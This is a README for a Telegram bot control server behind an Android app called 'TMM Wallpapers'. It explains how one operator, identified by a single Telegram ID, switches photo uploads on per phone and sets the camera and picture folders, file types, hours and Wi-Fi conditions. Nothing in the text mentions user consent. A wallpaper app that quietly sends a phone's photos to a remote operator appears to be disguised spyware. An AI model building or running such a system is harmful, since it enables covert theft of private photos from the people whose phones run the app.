# TMM Wallpapers Telegram control server

This service keeps per-phone upload policies and exposes them to the Android app.
The Telegram bot accepts commands only from user/chat ID `7042436066`.

Never put the bot token in the APK, repository, or a public workflow. Export it at
runtime:

```sh
export TELEGRAM_BOT_TOKEN='...'
python3 control_server.py
```

Put this service behind HTTPS at the same host configured by
`UploadConfig.controlUrl`, or change that value before building.

Commands:

```text
/phones
/status DEVICE_ID
/backup DEVICE_ID on|off
/interval DEVICE_ID SECONDS
/hours DEVICE_ID START_HOUR END_HOUR
/wifi DEVICE_ID on|off
/folders DEVICE_ID DCIM/Camera/,Pictures/
/extensions DEVICE_ID jpg,png,webp
```

All phones default to backup disabled. A phone is registered when the app first
starts and is listed by `/phones`.
